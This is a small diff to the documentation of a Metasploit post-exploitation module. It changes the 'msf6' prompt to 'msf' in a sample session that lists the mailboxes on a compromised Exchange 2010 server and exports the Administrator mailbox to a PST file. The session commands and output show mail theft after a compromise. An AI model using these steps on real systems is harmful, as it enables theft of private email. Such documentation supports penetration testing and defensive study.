@@ -74,10 +74,10 @@
 ### Windows Server 2012 R2 with On-Premise Exchange Server 2010
 
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/exchange
-msf6 post(windows/gather/exchange) > set SESSION 1
+msf exploit(multi/handler) > use post/windows/gather/exchange
+msf post(windows/gather/exchange) > set SESSION 1
 SESSION => 1
-msf6 post(windows/gather/exchange) > run -a LIST
+msf post(windows/gather/exchange) > run -a LIST
 
 [+] Exchange Server is present on target machine
 [+] PowerShell is present on target machine
@@ -100,9 +100,9 @@ Mailboxes:
 [...]
 
 [*] Post module execution completed
-msf6 post(windows/gather/exchange) > set MAILBOX "Administrator"
+msf post(windows/gather/exchange) > set MAILBOX "Administrator"
 MAILBOX => Administrator
-msf6 post(windows/gather/exchange) > run -a EXPORT
+msf post(windows/gather/exchange) > run -a EXPORT
 
 [+] Exchange Server is present on target machine
 [+] PowerShell is present on target machine
@@ -117,5 +117,5 @@ Exporting done
 [*] Resulting export file size: 0.26 MB
 [+] PST saved in: /home/user/.msf4/loot/20210309120402_default_192.168.1.70_PST_427036.pst
 [*] Post module execution completed
-msf6 post(windows/gather/exchange) >
+msf post(windows/gather/exchange) >
 ```
